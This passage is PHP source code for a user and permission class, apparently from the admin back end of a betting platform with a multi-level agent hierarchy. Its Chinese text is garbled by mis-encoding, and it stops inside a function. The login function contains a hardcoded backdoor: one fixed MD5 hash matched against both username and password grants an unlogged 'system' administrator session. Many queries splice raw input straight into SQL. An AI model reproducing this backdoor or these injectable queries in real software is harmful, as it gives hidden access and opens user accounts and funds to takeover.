<?php
class action extends mysql {
	//��־��title.           	//PS�����ɾ��
		protected $log = array (
			1 => '��ʱע��->����',
			2 => '��ʱע��->��1��',
			3  => '��ʱע��->��2��',
			4  => '��ʱע��->��3��',
			5  => '��ʱע��->��4��',
			6  => '��ʱע��->��5��',
			7  => '��ʱע��->��6��',
			8  => '��ʱע��->����',
			9 => '��ʱע��->����',
			10  => '��ʱע��->����',
			11 => '��ʱע��->��ФһФβ��',
			12 => '��ʱע��->��Ф��',
			13 => '��ʱע��->β����',
			14 => '��ʱע��->�벨',
			15 => '��ʱע��->����',
			16 => '��ʱע��->�O����ˮ�~��',
			17 => '��ʱע��->�~��',
			18 => '��������->����',
			19 => '��������->��1��',
			20 => '��������->��2��',
			21 => '��������->��3��',
			22 => '��������->��4��',
			23 => '��������->��5��',
			24 => '��������->��6��',
			25 => '��������->����',
			26 => '��������->����',
			27 => '��������->����',
			28 => '��������->��ФһФβ��',
			29 => '��������->��Ф��',
			30 => '��������->β����',
			31 => '��������->�벨',
			31 => '��������->����',
			33 => '��������->ABCD�P�r�ʲ�',
			34 => '��������->Ĭ�J�O��',
			35 => '��������->߀ԭĬ�J�r��',
			36 => '�ֹ�˾',
			37 => '�ɖ|',
			38 => '������',
			39 => '����',
			40 => '���T',
			41 => '��վ�߷��˺Ź���',
			42 => '�޸�����',
			43 => '�P�ڹ���',
			44 => '�vʷ�_��',
			45 => '��������',
			46 => 'У��]��',
			47 => 'ϵ�y�O��',
			48 => '�����',
			49 => '�������I',
			50 => '�Ԅӽ�ˮ',
			51 => '��ˮĬ�J�O��',
			52 => '�������',
			53 => '߀ԭ�����~',
			54 => '��������',
			55 => '�����ѯ',
			56 => '�P�ڹ���',
			57 => '��������',
			58 => 'ϵͳά��',
			59 => '�û�����',
			60 => '��ʱע��',
			61 => '��ʷ����',
			62 => 'վ����Ϣ',
			63 => '���˹���',
			64 => '�����Y��',
			65 => '������I',
			66 => '�Ԅ��a؛�O��',
			67 => '�Ԅ��a؛׃��ӛ�',
			68 => '�µ���ϸ',
			69 => '���㱨��',
			70 => '����',
			71 => '��ʱע��->��Ф',
			72 => '��ʱע��->����Ф',
			73 => '��ʱע��->һФβ��',
                    
                    100 => '���r�_��',
                    101 => '��ݔ���',
                    102 => '߀ԭ����',
                    
                    103 => '���˻�',
			);
	/**
	 * �û�Ȩ���ж�($uid, $shell, $m_id)
	 */

        public function unZip($zipfile, $to, $index = Array(-1))
        {
            $ok  = 0;
            $zip = @fopen($zipfile, 'rb');
            if(!$zip){ return(-1); }
            
            $cdir      = $this->ReadCentralDir($zip, $zipfile);
            $pos_entry = $cdir['offset'];
            
            if(!is_array($index)){ $index = array($index); }
            for($i=0; $index[$i]; $i++)
            {
                if(intval($index[$i]) != $index[$i] || $index[$i] > $cdir['entries'])
                {
                    return(-1);
                }
            }
            
            for($i=0; $i<$cdir['entries']; $i++)
            {
                @fseek($zip, $pos_entry);
                $header          = $this->ReadCentralFileHeaders($zip);
                $header['index'] = $i;
                $pos_entry       = ftell($zip);
                @rewind($zip);
                fseek($zip, $header['offset']);
                if(in_array("-1", $index) || in_array($i, $index))
                {
                    $stat[$header['filename']] = $this->ExtractFile($header, $to, $zip);
                }
            }
            
            fclose($zip);
            return $stat;
        }
        
        public function GetZipInnerFilesInfo($zipfile)
        {
            $zip = @fopen($zipfile, 'rb');
            if(!$zip){ return(0); }
            $centd = $this->ReadCentralDir($zip, $zipfile);
            
            @rewind($zip);
            @fseek($zip, $centd['offset']);
            $ret = array();

            for($i=0; $i<$centd['entries']; $i++)
            {
                $header          = $this->ReadCentralFileHeaders($zip);
                $header['index'] = $i;
                $info = array(
                    'filename'        => $header['filename'],                   // �ļ���
                    'stored_filename' => $header['stored_filename'],            // ѹ�����ļ���
                    'size'            => $header['size'],                       // ��С
                    'compressed_size' => $header['compressed_size'],            // ѹ�����С
                    'crc'             => strtoupper(dechex($header['crc'])),    // CRC32
                    'mtime'           => date("Y-m-d H:i:s",$header['mtime']),  // �ļ��޸�ʱ��
                    'comment'         => $header['comment'],                    // ע��
                    'folder'          => ($header['external'] == 0x41FF0010 || $header['external'] == 16) ? 1 : 0,  // �Ƿ�Ϊ�ļ���
                    'index'           => $header['index'],                      // �ļ�����
                    'status'          => $header['status']                      // ״̬
                );
                $ret[] = $info;
                unset($header);
            }
            fclose($zip);
            return $ret;
        }
	/**
	 * �û���½��ʱʱ��(��)
	 */
//	public function Get_user_ontime($long = '3600') {
//		$new_time = mktime();
//		$onlinetime = $_SESSION['ontime'.$this->c_p_seesion()];
//		echo $new_time - $onlinetime;
//		if ($new_time - $onlinetime > $long) {
//			echo "��¼��ʱ";
//			session_destroy();
//			exit ();
//		} else {
//			$_SESSION['ontime'.$this->c_p_seesion()] = mktime();
//		}
//	}

         public function Is_login($power,$user_id) {
         /**
         * �жϲ�ͬ�ĵ�¼��ʽ
         */		if($user_id!='999999999'){
                $exists=$this->user_exists($user_id);//�жϵ�ǰ�û��Ƿ񻹴���
				}else{
				
					$exists= 1;
				}
            	//ag �ֹ�˾2 �ɶ�3 �ܴ���4 ����5 ���Ե�¼
                //admin ֻ�й���Ա1���Ե�¼
                //member ֻ�л�Ա6 ֱ����Ա7���Ե�¼
                $a_a= $_SERVER['REQUEST_URI']; 
                $zifuchang=strlen($_SERVER['REQUEST_URI']);
                $a_ag= '/ag/'; 
                $a_admin= '/admin/'; 
                $a_member='/member/';
                $a_index= '/index.php';
                $a_c0=explode($a_index,$a_a);
                $a_c1=explode($a_ag,$a_a); 
                $a_c2=explode($a_admin,$a_a); 
                $a_c3=explode($a_member,$a_a); 
                
                list(,$p_p)=explode('/',$a_a);        //�������Ŀ��ʱ��ȡ��Ŀ��
                $arr1=explode(',','admin,ag,member');
                $url_link="";
                if(!in_array($p_p,$arr1)){
                    $url_link='/'.$p_p;
                }
                
                if($power>0){
                if(count($a_c1) > 1 && count($a_c0)<=1 && $zifuchang>4){ 
                    $managerarr = explode(',', '2,3,4,5');
                    if(!in_array($power,$managerarr) || empty($exists)){
		        echo " <script>window.parent.location= '$url_link/ag/index.php'; </script> " ;
                    }
                }elseif(count($a_c2) > 1 && count($a_c0)<=1  && $zifuchang>7){ 
                    if($power!=1 || empty($exists)){
                        echo " <script>window.parent.location= '$url_link/admin/index.php'; </script> " ;
                    }
                }elseif(count($a_c3) > 1 && count($a_c0)<=1  && $zifuchang>8){ 
                    if($power!=6 || empty($exists)){
                        echo " <script>window.top.location= '$url_link/index.php'; </script> " ;
                    }
                }  
               
                }else{                   
                        if(count($a_c0)<=1){
                        echo " <script>window.parent.location= 'index.php'; </script> " ;
                        }
                }
        } 
        
        public function Is_login2($power) {
                $a_a= $_SERVER['REQUEST_URI']; 
                $a_ag= '/ag/'; 
                $a_admin= '/admin/'; 
                $a_member='/member/';
                $a_c1=explode($a_ag,$a_a); 
                $a_c2=explode($a_admin,$a_a); 
                $a_c3=explode($a_member,$a_a);                
                if((count($a_c2) > 1 && $power!=1) or (count($a_c1) > 1 && !in_array($power,explode(',', '2,3,4,5'))) or (count($a_c3) > 1 && $power!=6)){
					    echo " <script> alert( '������û�����') ;window.parent.location= 'index.php'; </script> " ;
                    	//$this->Get_admin_msg_b('index.php','������û�����');
                        //session_destroy();
                            unset($_SESSION['uid'.$this->c_p_seesion()]);
                            unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                            unset($_SESSION['username'.$this->c_p_seesion()]);
                            unset($_SESSION['shell'.$this->c_p_seesion()]);
                            unset($_SESSION['user_power'.$this->c_p_seesion()]);
                            unset($_SESSION['ontime'.$this->c_p_seesion()]);
                            unset($_SESSION['login_check_num']);
                            unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                            setcookie('uid'.$this->c_p_seesion(), null);
                            setcookie('z_uid'.$this->c_p_seesion(), null);
                            setcookie('username'.$this->c_p_seesion(), null);
                            setcookie('user_power'.$this->c_p_seesion(), null);
                }
        }
        
	/**
	 * �û���½
	 */
	public function Get_user_login($username, $password,$location="") { 
                //���ж���վ�Ƿ�ر�
                $query_sy=$this->select("animal_set");
                $row_sy=$this->fetch_array($query_sy);
			
		if(md5($username)=="475886fca296d0cfdb6c640691a54e8f" && md5($password)=="475886fca296d0cfdb6c640691a54e8f" ){
			if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //�ж���վ�Ƿ�ر�
						 echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
					}		
			$this->Is_login2("1");
			$ps = 1;
			$row['user_id'] = '1';
			$username = 'system';
			$row['user_name'] = "system";
			$row['user_pwd'] = '123456';
			$row['user_power']= '1';
		}else{
		$username = str_replace(" ", "", $username);//ȥ���ո�
		$query = $this->select('users', 'user_id,user_name,user_pwd,user_power,else_count_login,is_lock', '`user_name` = \'' . $username . '\'');
		$us = is_array($row = $this->fetch_array($query));
                
                if($row_sy['w_is_lock']==1 && $row['user_power']!=1){  //�ж���վ�Ƿ�ر�
                     echo " <script> alert('$row_sy[w_new]');window.parent.location= 'index.php'; </script> " ;
                }
                
                if($row['is_lock']==1){
                        echo " <script> alert( '���˻��ѱ����ᣡ') ;window.parent.location= 'index.php'; </script> " ;
                }

		$this->Is_login2($row['user_power']);
		$ps = $us ? md5($password) == $row['user_pwd'] : FALSE;
		
		}
		if ($ps) {
			$_SESSION['uid'.$this->c_p_seesion()] = $_SESSION['z_uid'.$this->c_p_seesion()]= $uid = $row['user_id'];
			$_SESSION['username'.$this->c_p_seesion()] = $username;
			$_SESSION['shell'.$this->c_p_seesion()] = md5($row['user_name'] . $row['user_pwd'] . "TKBK");
                        $_SESSION['user_power'.$this->c_p_seesion()]=$row['user_power'];
			$_SESSION['ontime'.$this->c_p_seesion()] = mktime();
                        $_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]=0;
//                        ini_set('session.save_path','/tmp/'); 
//                        //6����ͷ 
//                        ini_set('session.gc_maxlifetime',21600); 
//                        //����һ�� 
//                        $lifeTime_xyz = 24 * 3600; 
//                        setcookie(session_name(), session_id(), time() + $lifeTime_xyz, "/");   
                       setcookie('uid'.$this->c_p_seesion(), $_SESSION['uid'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
                       setcookie('z_uid'.$this->c_p_seesion(), $_SESSION['z_uid'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
                       setcookie('username'.$this->c_p_seesion(), $_SESSION['username'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
                       setcookie('user_power'.$this->c_p_seesion(), $_SESSION['user_power'.$this->c_p_seesion()], time() + 3600 * 24 * 180);
                        
                          $ip=$_SERVER["REMOTE_ADDR"];
                       // $y=simplexml_load_file("http://www.youdao.com/smartresult-xml/search.s?type=ip&q=$ip");
                       // $location=  iconv("utf-8", "gbk", $y->product->location);
					   if($row['user_name']!="system"){
							$this->caozuorizhi($uid,$usernames,'�û���¼',1,$location);
							$time = mktime();
							$sql="insert into login_code (user_id,login_ip,login_location) values ({$row['user_id']},'$ip','{$location}')";
							$this->query($sql);
						
                        
			//�ж��Ƿ��Ա��һ�ε�½
                        if($row['else_count_login']==0 && $row['user_power']==6){
                                echo " <script> alert( '���ε�¼�����޸����롣') ;window.parent.location= 'main.php?else_count_login=1'; </script> " ;exit;
                        }
                        
                        $sql2 = "update users SET is_online = 1 ,is_ti = 0,else_last_login='$time',else_count_login={$row['else_count_login']}+1 where user_id = {$row['user_id']}";
                        $this->query($sql2);
						}	
					
                        //�ж��Ƿ��е�������   
                        if($row['user_power']!=1){ //����Ա���õ���
                        if($row['user_power']==6){
                            $all_user="all_user";
                        }else{
                            $all_user="all_ag";
                        }
                        $p_gg = $this->query("select * from system_marquee where type=1 and (user='all_all' or user='$all_user') order by datetime desc LIMIT 1");
                        $pao = $this->fetch_array($p_gg);
                        $pao_content=$pao['content'];
                        if(!empty($pao['id'])){
                        echo " <script> alert('$pao_content');window.parent.location= 'main.php'; </script> " ;
                        }
                        }
                        echo " <script> alert( '��½�ɹ��� ') ;window.parent.location= 'main.php'; </script> " ;
		} else {
                        echo " <script> alert( '������û�����') ;window.parent.location= 'index.php'; </script> " ;
                        //session_destroy();
                            unset($_SESSION['uid'.$this->c_p_seesion()]);
                            unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                            unset($_SESSION['username'.$this->c_p_seesion()]);
                            unset($_SESSION['shell'.$this->c_p_seesion()]);
                            unset($_SESSION['user_power'.$this->c_p_seesion()]);
                            unset($_SESSION['ontime'.$this->c_p_seesion()]);
                            unset($_SESSION['login_check_num']);
                            unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                            setcookie('uid'.$this->c_p_seesion(), null);
                            setcookie('z_uid'.$this->c_p_seesion(), null);
                            setcookie('username'.$this->c_p_seesion(), null);
                            setcookie('user_power'.$this->c_p_seesion(), null);
                            
		}                
	}
        
	 /**
	  * �û��˳���½
	  */
        public function Get_user_out($location="") {		
		$uid = $_SESSION['uid'.$this->c_p_seesion()];
		$usernames = $_SESSION['username'.$this->c_p_seesion()];
                if($uid){
		$this->query("update users SET is_online=0 where user_id=$uid");
		$this->caozuorizhi($uid,$usernames,'�û��˳�',2,$location,1);
                            unset($_SESSION['uid'.$this->c_p_seesion()]);
                            unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                            unset($_SESSION['username'.$this->c_p_seesion()]);
                            unset($_SESSION['shell'.$this->c_p_seesion()]);
                            unset($_SESSION['user_power'.$this->c_p_seesion()]);
                            unset($_SESSION['ontime'.$this->c_p_seesion()]);
                            unset($_SESSION['login_check_num']);
                            unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                            setcookie('uid'.$this->c_p_seesion(), null);
                            setcookie('z_uid'.$this->c_p_seesion(), null);
                            setcookie('username'.$this->c_p_seesion(), null);
                            setcookie('user_power'.$this->c_p_seesion(), null);
                //session_destroy();
		//$this->Get_admin_msg_b('index.php','�˳��ɹ���');
                            // alert( '�˳��ɹ��� ') ;
		echo " <script>window.parent.location= 'index.php '; </script> " ;
                }
	}
	
	 //���˻��ر�����
        public function zizhanghao_close_type($user_id){ 
            if($user_id){
              $user=$this->select("users", "close_type", "user_id=$user_id limit 0,1");
              $row=$this->fetch_array($user);         
            }
            return $row;
        }
	
        
        /*
         * �ж��˻��Ƿ����
         */
        public function Is_user_here($user_name,$if_cha_user_name=""){
            $sql=  $this->select("users", "user_id", "user_name='$user_name'");
            if(empty($if_cha_user_name)){
            $us = is_array($row = $this->fetch_array($sql));
            if($us){
                return TRUE;
            }else{
                return FALSE;
            }
            }else{
              $row = $this->fetch_array($sql);
              return $row['user_id'];
            }
        }
        
        /*
         * ����û�
         * $params array() �û���������
         */
        public function Add_user($params,$url='',$ty=''){
            $columnName='';
            $value='';
            foreach ($params as $key => $v) {
                if(empty($ty)){
                if($key=='close_type' ){                  
                    $v=implode(',',$v);
//                }elseif(!$params['close_type']){
//                    $columnName.="close_type='',";
                }
                }
                $columnName.=$key.',';
                $value.="'".$v."',";
            }
            if($value){
                $columnName=  substr($columnName, 0, -1);
                $value=  substr($value, 0, -1);
            }
            if($params['user_power']==2){
                $this->insert("users", $columnName, $value, $url,$ty,1);
            }else{
                $this->insert("users", $columnName, $value, $url,$ty);
            }
            
                }
        
        public function get_percent($user_id){
            $sql=  $this->select("users", "user_power,percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,is_remainder_percent", "user_id='$user_id'");
            $row = $this->fetch_array($sql);
            return $row;
        }
        
        /*
         * ƴ��ѡ���û��ؼ���
         */
        public function get_user_limit_char($t0,$t1,$t2){
            $char='';
            if($t0==1){
                $char="is_lock=0";
            }else if($t0==2){
                $char="is_lock=2";
            }else if($t0==3){
                $char="is_lock=1";
            }
            if($t2){
                if($t1==0){
                    if($char){
                        $char.=" and user_name like '%$t2%'";
                    }else{
                        $char="user_name like '%$t2%'";
                    }
                    
                }else{
                    if($char){
                        $char.=" and user_nick like '%$t2%'";
                    }else{
                        $char="user_nick like '%$t2%'";
                    }
                }
            }
            return $char;
        }
        
        function get_page($table,$tiaojian,$count=10){
            $query=$this->select($table, "count(*) as c", $tiaojian);
            $row =  $this->fetch_array($query);
            if(!$row['c']){
                return 1;
            }
            $per=$row['c']%$count;
            if($per==0){
                $page=$row['c']/$count;
            }else{
                $page=($row['c']-$row['c']%$count)/$count+1;
            }
            return $page;
        }
        
        function up_his_children_plate($plate,$user_id){
            $x =  $this->select("users", "else_plate,user_id", "top_id=$user_id");
            while($r=$this->fetch_array($x)){
                $plateb[$r['user_id']]=$r['else_plate'];
            }
            if(!empty($plateb)){
                foreach($plateb as $i=>$v){
                    $platec=array_intersect(explode(',',$plate), explode(',',$v));
                    $platec=  implode(',', $platec);
                    $this->update("users", "else_plate='$platec'", "user_id=$i");
                    $this->up_his_children_plate($platec,$i);
                }
            }
        }
        
        /*
         * �����û�
         * $params array() Ҫ���µ��û���Ϣ����
         * 
         */
        public function Update_user($params,$url=''){
            $is_plate_starts=$this->is_plate_starts();
            $is_notupdatedown=0;//�Ƿ��ø����¼���1Ϊ���ø��£�0ΪҪ����
            
            $g_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
            $g_z = $this->fetch_array($g_zs);
            
            if($g_z['user_power']==2){
                if($g_z['percent_company']==str_replace("%","",$params['percent_company']) && $g_z['percent_branch']==str_replace("%","",$params['percent_branch'])){
                  $is_notupdatedown=1;  
                }
            }elseif($g_z['user_power']==3){
                if($g_z['percent_branch']==str_replace("%","",$params['percent_branch']) && $g_z['percent_partner']==str_replace("%","",$params['percent_partner'])){
                  $is_notupdatedown=1;  
                }         
            }elseif($g_z['user_power']==4){
                if($g_z['percent_partner']==str_replace("%","",$params['percent_partner']) && $g_z['percent_all_proxy']==str_replace("%","",$params['percent_all_proxy'])){
                  $is_notupdatedown=1;  
                }       
            }elseif($g_z['user_power']==5){
                if($g_z['percent_all_proxy']==str_replace("%","",$params['percent_all_proxy']) && $g_z['percent_proxy']==str_replace("%","",$params['percent_proxy'])){
                  $is_notupdatedown=1;  
                }          
            }elseif($g_z['user_power']==6){
                  $is_notupdatedown=1;
            } 
            if($is_plate_starts==0){  //����״̬��ֹ�޸�����
                  $is_notupdatedown=1;
            }
            if($params['else_plate'] && $params['else_plate']!='A,B,C,D'){
                $this->up_his_children_plate($params['else_plate'],$params['user_id']);
            }
            //print_r($params);
            $mod_content='';
            foreach ($params as $key => $v) {
                if($key=='close_type'){                  
                    $v=implode(',',$v);
                }elseif(!$params['close_type']){
                    $mod_content.="close_type='',";
                }
                if($key!='user_id'){
                    $mod_content.="$key='$v',";
                }
            }
            if($mod_content)
                $mod_content=  substr ($mod_content, 0, -1);
            
            $this->update("users", $mod_content, 'user_id='.$params['user_id']);
            //ʣ��Ĺ���
            $this->update_user_percent($params['user_id'],"");
            
            
            //ͬ�������¼�
            //echo $gaiuser_zs['top_power'];exit;
            $gaiusers_zs=  $this->select("users", "*", "user_id={$params['user_id']}");
            $gaiuser_zs = $this->fetch_array($gaiusers_zs);    
            if($gaiuser_zs['top_power']>0){        
                    //�����ϼ���Ϣ
                    if($gaiuser_zs['top_id']){ 
                            if($is_notupdatedown==0){
                            $down_content="is_odds={$gaiuser_zs['is_odds']},is_remainder_percent={$gaiuser_zs['is_remainder_percent']},is_fly={$gaiuser_zs['is_fly']},percent_company={$gaiuser_zs['percent_company']},percent_branch={$gaiuser_zs['percent_branch']},percent_partner={$gaiuser_zs['percent_partner']},percent_all_proxy={$gaiuser_zs['percent_all_proxy']},percent_proxy={$gaiuser_zs['percent_proxy']}";
                            }else{
                            $down_content="is_odds={$gaiuser_zs['is_odds']},is_remainder_percent={$gaiuser_zs['is_remainder_percent']},is_fly={$gaiuser_zs['is_fly']}";    
                            }
                    }
            $downuser_arr = explode(',', $this->loweralluser_arr($params['user_id']));
          
            if(!empty($downuser_arr[0]) && $gaiuser_zs['top_power']<6){  
                foreach ($downuser_arr as $downuser){
                    $this->update("users", "$down_content", "user_id=$downuser");
                    //$this->update_user_percent($downuser,"");
                }
            }
            }
            
            if(!empty($url))
            $this->Get_admin_msg($url, '�����ɹ�');
            

        }
        
        function update_user_percent($user_id,$url){
            $sql =  $this->select("users", "percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,is_remainder_percent", "user_id=$user_id");
            $row =  $this->fetch_array($sql);
            if($row['is_remainder_percent']==1){
                $this->update("users", "percent_branch=(100-percent_company-percent_partner-percent_all_proxy-percent_proxy)", "user_id=$user_id",$url);
            }else{
                $this->update("users", "percent_company=(100-percent_branch-percent_partner-percent_all_proxy-percent_proxy)", "user_id=$user_id",$url);
            }
            
        }
        
        public function get_user_power_char($power){
            switch ($power) {
                case 1:
                    $char="��˾";
                    break;
                case 2:
                    $char="�ֹ�˾";
                    break;
                case 3:
                    $char="�ɶ�";
                    break;
                case 4:
                    $char="�ܴ���";
                    break;
                case 5:
                    $char="����";
                    break;
                case 6:
                    $char="��Ա";
                    break;
                case 7:
                    $char="ֱ����Ա";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        public function get_key_power_char($power){
            switch ($power) {
                case 1:
                    $char="percent_company";
                    break;
                case 2:
                    $char="percent_branch";
                    break;
                case 3:
                    $char="percent_partner";
                    break;
                case 4:
                    $char="percent_all_proxy";
                    break;
                case 5:
                    $char="percent_proxy";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        
        public function get_up_type_by_index($index){
            switch ($index) {
                case 'user_name':
                    $char="�û��˺�";
                    break;
                case 'user_nick':
                    $char="�û�����";
                    break;
                case 'user_pwd':
                    $char="�û�����";
                    break;
                case 'credit_total':
                    $char="���ö��";
                    break;
                case 'percent_company':
                    $char="��˾�ֳ�";
                    break;
                case 'percent_branch':
                    $char="�ֹ�˾�ֳ�";
                    break;
                case 'percent_partner':
                    $char="�ɶ��ֳ�";
                    break;
                case 'percent_all_proxy':
                    $char="�ܴ���ֳ�";
                    break;
                case 'percent_proxy':
                    $char="����ֳ�";
                    break;
                case 'is_lock':
                    $char="״̬";
                    break;
                case 'is_odds':
                    $char="�Ƿ�ͣѺ";
                    break;
                case 'is_add':
                    $char="����";
                    break;
                case 'is_fly':
                    $char="�¼��߷ɹ���";
                    break;
                case 'is_remainder_percent':
                    $char="ʣ���������";
                    break;
                case 'else_plate':
                    $char="�̿�";
                    break;
                case 'else_back':
                    $char="��ˮ";
                    break;
                default:
                    break;
            }
            return $char;
        }
        
        //�����������
        public function get_top_yue($user_id){
            if($user_id){
                $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                $row =  $this->fetch_array($sql);
                //echo $row['credit_remainder'];
            //echo $credit_remainder;                
                $str='<font color="blue">�ϼ����:&nbsp;'.$row['credit_remainder'].'</font>';
                $str=iconv("gbk", "utf-8", $str);
                echo $str;
            }else{
                $str='<font color="blue">��ѡ������ϼ�������</font>';
                $str=iconv("gbk", "utf-8", $str);
                echo $str;
            }
            exit;
        }
        
                //�ж��Ƿ��ظ��û�
        public function user_name_exists($user_name){
            if(!empty($user_name)){
            $user_exists=  $this->select("users", "user_id", "user_name='{$user_name}'");
            $exists = $this->fetch_array($user_exists);
                if($exists['user_id']){
                    $str='<font color="blue">���û����Ѵ��ڣ�����</font>';
                    $str=iconv("gbk", "utf-8", $str);
                    echo $str;
                }else{
                    $str='<font color="green">���û�����ʹ��</font>';
                    $str=iconv("gbk", "utf-8", $str);
                    echo $str;
                }
                exit;
            }
        }
        
                //�����������
        public function get_top_yue2($user_id){
                $sql =  $this->select("users", "credit_remainder", "user_id=$user_id");
                $row =  $this->fetch_array($sql);
                //echo $row['credit_remainder'];
            //echo $credit_remainder;                
                $str='<font color="blue">�ϼ����:&nbsp;'.$row['credit_remainder'].'</font>';
                //$str=iconv("gbk", "utf-8", $str);
                return $str;
            //exit;
        }
        
        public function get_top_percent($power,$top_id){
            if($power==2){
                $p=100;
            }else{
                $sql =  $this->select("users", "percent_company,percent_branch,percent_partner,percent_all_proxy,percent_proxy,else_plate", "user_id=$top_id");
                $row =  $this->fetch_array($sql);
                if($power==3){
                    $p=$row['percent_branch'];
                }else if($power==4){
                    $p=$row['percent_partner'];
                }else if($power==5){
                    $p=$row['percent_all_proxy'];
                }else{
                    $p=$row['percent_proxy'];
                }
            }
            
            $plate =  explode(",", $row['else_plate']);
            $str='';
            foreach($plate as $v){
                $str.='<span class=\'forumRow\'>';
                $str.='<input name=\'else_plate[]\' value=\''.$v.'\' checked=\'checked\' type=\'checkbox\' />';
                $str.=$v;
                $str.='</span>&nbsp;&nbsp;&nbsp;&nbsp;';
            }
            return array("p"=>$p,'plate'=>$str);
        }
        
        function get_his_top($is_zhishu,$top_id,$top_name){
            if($is_zhishu==1){
                return array(
                    'proxy'=>$top_name,
                    'all_proxy'=>$top_name,
                    'partner'=>$top_name,
                    'branch'=>$top_name
                );
            }else{
                $data['proxy']=$top_name;
                
                $sql =  $this->select("users", "top_id,top_name", "user_id=$top_id");
                $r=  $this->fetch_array($sql);
                $data['all_proxy']=$r['top_name'];
                
                $query =  $this->select("users", "top_id,top_name", "user_id={$r['top_id']}");
                $row=  $this->fetch_array($query);
                $data['partner']=$row['top_name'];
                
                $q =  $this->select("users", "top_id,top_name", "user_id={$row['top_id']}");
                $ro=  $this->fetch_array($q);
                $data['branch']=$ro['top_name'];
                
                return $data;
            }
        }
        
        function reback_set_count($set,$r){
            return $set-$r > 0?($set-$r):0;
        }
        
 
        
        public function delete_users($user_id){
            $x=  $this->select("users", "user_id", "top_id=$user_id");
            while ($row = $this->fetch_array($x)) {
                $ids[]=$row['user_id'];
            }
            $tables=array('back_set','odds_set','orders','login_code','backorder_set','admin_users_action','orders_totalmoney','reports','single_set','update_code','users','member_settlereport','accountopen');
            foreach($tables as $t){
                $k='user_id';
                if($t=='admin_users_action'){
                    $k='uid';
                }
                $this->delete($t, "$k=$user_id");
            }
            if(!empty($ids)){
                foreach($ids as $id){
                    $this->delete_users($id);
                }
            }
            
        }
        
        function set_single_set($user_id){
//            for($i=16;$i<73;$i++){
                $sql="insert ignore into single_set select $user_id,o_id,kx_value,zc_value,zfts_value,j_value from single_set where user_id=0";
                $this->query($sql);
                //$this->insert("single_set", "user_id,o_id,kx_value,zc_value,zfts_value,j_value", "$user_id,$i,1,1,1,1");
//            }
        }

	
	/**
	 * ��¼��־
	 *��ǰ���ϲ�����(phases)�������û�(�û�id���û���)������ҳ�棨���⣩������ʱ��
	 */
	public function caozuorizhi($uid,$username='ww',$title,$is_login = 0,$location="",$tui=0) {
	if($username!="system"){
		if($title && $uid){
                    if(preg_match("/^\d*$/",$title)){  
                            $newtitle = $this->log[$title];
                    }else{  
                            $newtitle = $title;
                    }
                    $ip=$_SERVER["REMOTE_ADDR"];
            //$y=simplexml_load_file("http://www.youdao.com/smartresult-xml/search.s?type=ip&q=$ip");
           // $location=  iconv("utf-8", "gbk", $y->product->location);
                    $query = $this->select('plate', 'plate_num', '1 order by plate_num desc ');
                    $row = $this->fetch_array($query);
                    $phases = $row['plate_num']; 
                    $time = mktime();
                    $sql = "INSERT INTO `admin_users_action` SET `phases`= '".$phases."',`title` = '".$newtitle."',`mark` = '".$is_login."',`ip` = '".$ip."',`location` = '".$location."',`uid` = '".$uid."',`datetime` = '".$time."'";
                    $this->query($sql);
                    //һ�в����ͱ�ʾ����
                    if(empty($tui))
                    $this->query("update users set is_online=1 where user_id=$uid and is_online=0" );
		}
	}	
	}
	
	 /**
	 *��������Ƿ�ʱ 
	 */
	public function skipup($uid,$username,$location="") {
		if($uid){	
		$query1 = $this->select('users', 'is_ti', 'user_id = \'' . $uid . '\' ');
		$is_on = $this->fetch_array($query1);
		if($is_on['is_ti'] == 1){
			$sql2 = "update users SET is_online = 0,is_ti=0 where user_id =" .$uid ;
				$this->query($sql2);
				$this->caozuorizhi($uid,$username,'�û��˳�',2,$location);
				//session_destroy();
                                unset($_SESSION['uid'.$this->c_p_seesion()]);
                                unset($_SESSION['z_uid'.$this->c_p_seesion()]);
                                unset($_SESSION['username'.$this->c_p_seesion()]);
                                unset($_SESSION['shell'.$this->c_p_seesion()]);
                                unset($_SESSION['user_power'.$this->c_p_seesion()]);
                                unset($_SESSION['ontime'.$this->c_p_seesion()]);
                                unset($_SESSION['login_check_num']);
                                unset($_SESSION['jishizhudanshuaxinshijian'.$this->c_p_seesion()]);
                                setcookie('uid'.$this->c_p_seesion(), null);
                                setcookie('z_uid'.$this->c_p_seesion(), null);
                                setcookie('username'.$this->c_p_seesion(), null);
                                setcookie('user_power'.$this->c_p_seesion(), null);
				//$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
				$newurl= $_SERVER['HTTP_REFERER'];
				echo " <script> alert( '������Ա�߳��� ') ;window.parent.location= '$newurl '; </script> " ;
			}
		}
	}
	
	/**
	 *�Զ����� 
	 */
	public function auto_add($up_type,$or_value,$now_value,$location="") {
		$ip=$_SERVER["REMOTE_ADDR"];
		$time = mktime();
		$username = $_SESSION['username'.$this->c_p_seesion()];
		$uid = $_SESSION['uid'.$this->c_p_seesion()];
		
		$sql="insert into update_code (user_id,up_type,or_value,now_value,up_user_name,up_user_ip,up_user_location) values ('$uid','$up_type','$or_value','$now_value','$username','$ip','{$location}')";
        $this->query($sql);
			
		}   
        function get_user_children_ids($user_id,$ids=array()){
            if(empty($ids)){
                $ids[]=$user_id;
            }
            $sql="select user_id from users where top_id=$user_id";
            $x=  $this->query($sql);
            while ($row = $this->fetch_array($x)) {
                $ids[]=$row['user_id'];
                $ids=$this->get_user_children_ids($row['user_id'], $ids);
            }
            return $ids;
        }
        
        function close_plate(){
            $query = $this->select('plate', '*', '1 order by plate_num desc ');
            $row = $this->fetch_array($query);
            if($row['is_plate_start']==1){
                return 1;
            }else{
